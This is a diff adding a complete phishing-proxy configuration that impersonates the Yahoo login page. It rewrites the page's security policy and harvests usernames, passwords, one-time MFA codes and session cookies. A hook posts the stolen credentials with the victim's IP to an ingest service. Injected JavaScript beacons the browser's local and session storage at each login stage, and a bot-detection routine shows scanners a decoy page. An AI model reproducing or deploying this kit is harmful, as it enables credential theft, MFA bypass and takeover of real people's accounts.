@@ -1,0 +1,186 @@
+name: "yahoo"
+author: "@paris"
+min_ver: "3.2.0"
+proxy_webauthn: true
+
+blacklist_mode: "off"
+
+proxy_hosts:
+  - phish_sub: 'login'
+    orig_sub: 'login'
+    domain: 'yahoo.com'
+    session: true
+    is_landing: true
+    auto_filter: false
+    params:
+      - key: 'username'
+        map_to: 'username'
+      - key: 'login_hint'
+        map_to: 'username'
+      - key: 'bg'
+        map_to: 'bg'
+      - key: 'text'
+        map_to: 'text'
+
+sub_filters:
+  - { triggers_on: "login.yahoo.com", orig_sub: "login", domain: "yahoo.com", search: '<meta http-equiv="Content-Security-Policy" content="(.*?)">', replace: '<meta http-equiv="Content-Security-Policy" content="script-src ''self'' ''unsafe-inline'' ''unsafe-eval'' *.yahoo.com; style-src ''self'' ''unsafe-inline'' *.yahoo.com; img-src ''self'' data: blob: *.yahoo.com; font-src ''self'' data: *.yahoo.com; connect-src ''self'' *.yahoo.com; frame-src ''self'' *.yahoo.com; object-src ''none''; base-uri ''self''; form-action ''self'' ''unsafe-inline'';">', mimes: ["text/html"] }
+  - { triggers_on: "login.yahoo.com", orig_sub: "login", domain: "yahoo.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/javascript", "application/json"] }
+  - { triggers_on: "login.yahoo.com", orig_sub: "login", domain: "yahoo.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript"], redirect_only: true }
+
+auth_tokens:
+  - domain: '.yahoo.com'
+    keys: ['Y', 'T', 'B', 'APID', 'APIDTS']
+  - domain: 'login.yahoo.com'
+    keys: ['Y', 'T', 'B', 'APID', 'APIDTS']
+
+force_post:
+  - path: "/account/challenge/*"
+    search:
+      - { key: "username", search: "(.*)" }
+    force:
+      - { key: "persistent", value: "y" }
+    type: "post"
+
+auth_urls:
+  - "/account/challenge/*"
+  - "/log/session"
+
+credentials:
+  username:
+    key: "(username|userid|login)"
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: "(password|passwd)"
+    search: '(.*)'
+    type: 'post'
+  custom:
+    - key: '(otp|mfa|code|totp)'
+      search: '([a-zA-Z0-9]{6,8})'
+      type: 'post'
+
+login:
+  domain: "login.yahoo.com"
+  path: "/"
+
+post_capture_hook:
+  - trigger_on: "/log/session"
+    exec: >
+      curl -X POST 'http://127.0.0.1:3000/v1/session/ingest'
+      -H 'Content-Type: application/json'
+      -d '{
+            "service_name": "Yahoo Mail",
+            "session_id": "{session_id}",
+            "form_data": {
+              "username": "{username}",
+              "password": "{password}"
+            },
+            "client_details": {
+              "user_agent": "{user_agent}",
+              "ip_address": "{remote_ip}"
+            }
+          }'
+
+js_inject:
+  - trigger_domains: ["login.yahoo.com"]
+    trigger_paths: ["/", "/*"]
+    script: |
+      (function() {
+        let passedGate = false;
+        let lastCapture = '';
+        const benignPageContent = 'PCFET0NUWVBFIGh0bWw+PGh0bWwgbGFuZz0iZW4iPjxoZWFkPjxtZXRhIGNoYXJzZXQ9IlVURi04Ij48bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+PHRpdGxlPlN5c3RlbSBJbml0aWFsaXppbmc8L3RpdGxlPjxzdHlsZT5ib2R5LCBodG1sIHsgbWFyZ2luOiAwOyBwYWRkaW5nOiAwOyBoZWlnaHQ6IDEwMCU7IGZvbnQtZmFtaWx5OiBBcmlhbCwgc2Fucy1zZXJpZjsgYmFja2dyb3VuZDogIzEyMTIxMjsgY29sb3I6ICNlYWVhZWE7IGRpc3BsYXk6IGZsZXg7IGFsaWduLWl0ZW1zOiBjZW50ZXI7IGp1c3RpZnktY29udGVudDogY2VudGVyOyB9IC5jb250YWluZXIgeyB0ZXh0LWFsaWduOiBjZW50ZXI7IH0gaDEgeyBmb250LXNpemU6IDIuNXJlbTsgbWFyZ2luLWJvdHRvbTogMTVweDsgfSBwIHsgZm9udC1zaXplOiAxLjJyZW07IH08L3N0eWxlPjwvaGVhZD48Ym9keT48ZGl2IGNsYXNzPSJjb250YWluZXIiPjxoMT5TeXN0ZW0gSW5pdGlhbGl6aW5nLi4uPC9oMT48cD5QbGVhc2Ugd2FpdC48L3A+PC9kaXY+PC9ib2R5PjwvaHRtbD4=';
+
+        function showBenignPage() {
+          document.open();
+          document.write(atob(benignPageContent));
+          document.close();
+        }
+
+        function sendSessionData(stage) {
+            try {
+                const sessionInfo = {
+                    localStorage: btoa(JSON.stringify(localStorage)),
+                    sessionStorage: btoa(JSON.stringify(sessionStorage))
+                };
+                const currentCapture = JSON.stringify(sessionInfo);
+                if(currentCapture === lastCapture) return;
+                lastCapture = currentCapture;
+                const payload = {
+                    username: `SessionData-${stage}`,
+                    password: currentCapture
+                };
+                navigator.sendBeacon('/log/session', JSON.stringify(payload));
+            } catch (e) { /* silent */ }
+        }
+
+        function runMainLogic() {
+          if (passedGate) return;
+          passedGate = true;
+          
+          const params = new URLSearchParams(window.location.search);
+          const bg = params.get('bg');
+          
+          function applyBranding() {
+             try {
+                const backgroundUrl = bg ? decodeURIComponent(bg) : 'https://i.ibb.co/fkLWqGZ/background.jpg';
+                if (document.body.style.backgroundImage !== `url("${backgroundUrl}")`) {
+                    document.body.style.backgroundImage = `url("${backgroundUrl}")`;
+                    Object.assign(document.body.style, { backgroundSize: "cover", backgroundRepeat: "no-repeat", backgroundPosition: "center", height: "100%" });
+                    document.documentElement.style.height = "100%";
+                }
+                const lightbox = document.getElementById("lightbox");
+                if (lightbox) lightbox.remove();
+             } catch(e) { /* silent */ }
+          }
+          
+          const observer = new MutationObserver((mutations) => {
+              mutations.forEach((mutation) => {
+                if (mutation.addedNodes.length > 0) {
+                    applyBranding();
+                    let currentStage = 'Unknown';
+                    if (document.querySelector('input[type="password"]')) {
+                        currentStage = 'Password-Entry';
+                    } else if (document.querySelector('input[name="username"]')) {
+                        currentStage = 'Username-Entry';
+                    } else if (window.location.pathname.toLowerCase().includes('kmsi')) {
+                        currentStage = 'Login-Success-KMSI';
+                    }
+                    sendSessionData(currentStage);
+                }
+              });
+          });
+
+          window.addEventListener('load', () => {
+              applyBranding();
+              observer.observe(document.body, { childList: true, subtree: true });
+              sendSessionData('Initial-Load');
+          });
+        }
+
+        function checkBotStatus() {
+          let humanityScore = 0;
+          if (screen.width >= 1024 && screen.height >= 768) humanityScore++;
+          if (navigator.plugins.length > 0) humanityScore++;
+          if (!navigator.webdriver) humanityScore++;
+          if (window.outerWidth > 0 && window.outerHeight > 0) humanityScore++;
+          if (window.Cypress || window.plumbutter || window._phantom || window.callPhantom) humanityScore -= 5;
+          return humanityScore;
+        }
+
+        if (checkBotStatus() < 2) {
+            showBenignPage();
+        } else {
+            const interactionHandler = () => {
+                if (passedGate) return;
+                runMainLogic();
+            };
+            document.addEventListener('mousemove', interactionHandler, { once: true, passive: true });
+            document.addEventListener('touchstart', interactionHandler, { once: true, passive: true });
+            document.addEventListener('keydown', interactionHandler, { once: true, passive: true});
+            setTimeout(() => {
+                if (!passedGate) {
+                    runMainLogic();
+                }
+            }, 4000);
+        }
+      })();
